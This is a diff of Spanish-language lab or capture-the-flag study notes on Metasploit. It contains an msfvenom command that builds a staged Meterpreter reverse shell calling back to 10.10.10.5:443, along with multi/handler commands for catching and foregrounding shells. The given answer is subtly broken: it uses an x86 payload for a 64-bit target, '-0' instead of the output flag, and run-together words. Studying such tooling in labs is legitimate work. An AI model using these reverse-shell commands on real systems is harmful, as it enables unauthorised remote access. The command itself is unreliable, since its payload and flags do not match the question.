@@ -60,8 +60,20 @@ Si su IP es 10.10.10.5, ¿qué sintaxis usaría para conectarse de nuevo a este 
  
     _
 
-¿Qué comando usaría para generar un shell inverso meterpreter por etapas para un destino Linux de 64 bits , asumiendo que su propia IP era 10.10.10.5 y estaba escuchando en el puerto 443? El formato del shell eself y el nombre del archivo de salida debe sershell
+¿Qué comando usaría para generar un shell inverso meterpreter por etapas para un destino Linux de 64 bits , asumiendo 
+que su propia IP era 10.10.10.5 y estaba escuchando en el puerto 443? El formato del shell eself y el nombre del archivo
+de salida debe sershell
 
     msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -0 shell LHOST=10.10.10.5 LPORT=443
 
+## Metasploit multi / handler
+
+¿Qué comando se puede usar para iniciar un oyente en segundo plano?
+ 
+    exploit -j
+
+Si acabáramos de recibir nuestro décimo shell inverso en la sesión actual de Metasploit, ¿cuál sería el comando
+utilizado para ponerlo en primer plano?
+
+    sessions 10
 
